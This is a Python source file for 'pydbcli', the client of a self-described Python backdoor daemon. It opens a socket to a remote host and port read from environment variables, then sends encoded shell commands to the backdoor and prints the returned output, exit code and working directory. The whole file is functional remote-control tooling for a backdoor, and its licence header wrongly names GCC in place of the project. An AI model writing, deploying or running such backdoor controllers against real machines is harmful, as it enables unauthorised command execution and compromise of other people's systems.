"""Copyright (C) 2020 Lucie Cupcakes <lucie_linux [at] protonmail.com>

This file is part of pybd <https://gitlab.com/lucie_cupcakes/pybd>.
GCC is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation; either version 3, or (at your option) any later
version.
GCC is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
for more details.
You should have received a copy of the GNU General Public License
along with GCC; see the file LICENSE.  If not see
<http://www.gnu.org/licenses/>."""

import sys, os, socket
from xzb64 import xzb64_encode, xzb64_decode

def client_main(rhost,rport=6969):
    read_input=True
    buff_size=1024
    srv_rc=-1
    srv_cwd=''
    s=socket.socket()
    s.connect((rhost, rport))
    while read_input:
        prompt=f'{srv_cwd}\n[{srv_rc}] %'
        print(prompt, end=' ')
        cmd=str(input()).strip()
        if cmd.lower()=='':
            cmd='sv_ping'
        s.send(xzb64_encode(cmd).encode('utf-8'))
        res=s.recv(buff_size).decode('utf-8').split('%') #rc%cmd_out_xzb64%cwd
        if len(res)!=3:
            print('Malformed response')
            exit()
        srv_rc=res[0]
        cmd_out=xzb64_decode(res[1])
        srv_cwd=res[2]
        print(cmd_out)
        if cmd.lower()=='exit':
            read_input=False
    s.close()

if __name__ == '__main__':
    print('pydbcli - Python Backdoor Daemon Client.')
    print('Forever beta software.')
    print('This software is Free software - released under the GPLv3 License')
    print('Read the LICENSE file. Or go visit https://www.gnu.org/licenses/gpl-3.0.html')
    client_main(rhost=os.environ['rhost'],rport=int(os.environ['rport']))
